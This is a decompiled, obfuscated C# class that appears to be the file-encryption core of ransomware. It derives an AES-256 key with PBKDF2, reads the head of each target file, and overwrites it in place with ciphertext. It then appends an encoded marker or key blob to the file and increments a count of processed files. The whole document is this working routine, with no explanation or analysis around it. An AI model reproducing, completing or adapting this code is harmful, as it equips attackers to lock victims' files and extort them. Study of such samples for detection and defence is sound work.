using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace fmTenshUnV;

public static class JODGCfeUBqfSiYrU
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] RjhBaSeYoCMetj(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = hjnHLXoxYVOZ(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes hjnHLXoxYVOZ(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] ZDfiLXsQVNoG(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (tnMCcqyYFYOXqEk.pKXDvwefnl == getString_0(107396803))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (tnMCcqyYFYOXqEk.XKASwlGUBpzh)
			{
				try
				{
					File.AppendAllText(tnMCcqyYFYOXqEk.UQSYzQClpMD, getString_0(107388334) + string_0 + getString_0(107402524) + ex.Message + getString_0(107396656));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void xEZuYNVpsYfClBPn(string NhYncFtSRCZPt, byte[] TmDAkSZaIXHu, byte[] EzXeaGcOJNH = null)
	{
		try
		{
			byte[] array = null;
			if (tnMCcqyYFYOXqEk.pKXDvwefnl == getString_0(107396803))
			{
				array = (tnMCcqyYFYOXqEk.nzkUSgBdGXcD ? Encoding.ASCII.GetBytes(tnMCcqyYFYOXqEk.BaxqkGxiBeqS(tnMCcqyYFYOXqEk.dxhwpdWQLYKeY) + tnMCcqyYFYOXqEk.BaxqkGxiBeqS(getString_0(107402498)) + Convert.ToString(tnMCcqyYFYOXqEk.rwFJViTtnOvWkjuSM) + tnMCcqyYFYOXqEk.BaxqkGxiBeqS(getString_0(107402498))) : Encoding.ASCII.GetBytes(tnMCcqyYFYOXqEk.BaxqkGxiBeqS(tnMCcqyYFYOXqEk.dxhwpdWQLYKeY) + tnMCcqyYFYOXqEk.BaxqkGxiBeqS(getString_0(107402507)) + Convert.ToString(tnMCcqyYFYOXqEk.rwFJViTtnOvWkjuSM) + tnMCcqyYFYOXqEk.BaxqkGxiBeqS(getString_0(107402507))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(NhYncFtSRCZPt, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(TmDAkSZaIXHu, 0, TmDAkSZaIXHu.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(NhYncFtSRCZPt, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!tnMCcqyYFYOXqEk.nzkUSgBdGXcD)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(EzXeaGcOJNH, 0, EzXeaGcOJNH.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (tnMCcqyYFYOXqEk.nzkUSgBdGXcD ? Encoding.ASCII.GetBytes(tnMCcqyYFYOXqEk.BaxqkGxiBeqS(tnMCcqyYFYOXqEk.dxhwpdWQLYKeY) + tnMCcqyYFYOXqEk.BaxqkGxiBeqS(getString_0(107402498)) + Convert.ToString(tnMCcqyYFYOXqEk.rwFJViTtnOvWkjuSM) + tnMCcqyYFYOXqEk.BaxqkGxiBeqS(getString_0(107402498))) : Encoding.ASCII.GetBytes(tnMCcqyYFYOXqEk.BaxqkGxiBeqS(tnMCcqyYFYOXqEk.dxhwpdWQLYKeY) + tnMCcqyYFYOXqEk.BaxqkGxiBeqS(getString_0(107402507)) + Convert.ToString(tnMCcqyYFYOXqEk.rwFJViTtnOvWkjuSM) + tnMCcqyYFYOXqEk.BaxqkGxiBeqS(getString_0(107402507))));
				FileStream fileStream2 = new FileStream(NhYncFtSRCZPt, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(TmDAkSZaIXHu, 0, TmDAkSZaIXHu.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(NhYncFtSRCZPt, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!tnMCcqyYFYOXqEk.nzkUSgBdGXcD)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(EzXeaGcOJNH, 0, EzXeaGcOJNH.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			tnMCcqyYFYOXqEk.puMlKkdeEF++;
		}
		catch (Exception ex)
		{
			if (tnMCcqyYFYOXqEk.XKASwlGUBpzh)
			{
				try
				{
					File.AppendAllText(tnMCcqyYFYOXqEk.UQSYzQClpMD, getString_0(107388334) + NhYncFtSRCZPt + getString_0(107402457) + ex.Message + getString_0(107396656));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (tnMCcqyYFYOXqEk.nzkUSgBdGXcD ? Encoding.ASCII.GetBytes(tnMCcqyYFYOXqEk.BaxqkGxiBeqS(tnMCcqyYFYOXqEk.dxhwpdWQLYKeY) + tnMCcqyYFYOXqEk.BaxqkGxiBeqS(getString_0(107402498)) + Convert.ToString(tnMCcqyYFYOXqEk.rwFJViTtnOvWkjuSM) + tnMCcqyYFYOXqEk.BaxqkGxiBeqS(getString_0(107402498))) : Encoding.ASCII.GetBytes(tnMCcqyYFYOXqEk.BaxqkGxiBeqS(tnMCcqyYFYOXqEk.dxhwpdWQLYKeY) + tnMCcqyYFYOXqEk.BaxqkGxiBeqS(getString_0(107402507)) + Convert.ToString(tnMCcqyYFYOXqEk.rwFJViTtnOvWkjuSM) + tnMCcqyYFYOXqEk.BaxqkGxiBeqS(getString_0(107402507))));
			FileStream fileStream4 = new FileStream(NhYncFtSRCZPt, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(TmDAkSZaIXHu, 0, TmDAkSZaIXHu.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(NhYncFtSRCZPt, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!tnMCcqyYFYOXqEk.nzkUSgBdGXcD)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(EzXeaGcOJNH, 0, EzXeaGcOJNH.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static JODGCfeUBqfSiYrU()
	{
		Strings.CreateGetStringDelegate(typeof(JODGCfeUBqfSiYrU));
	}
}
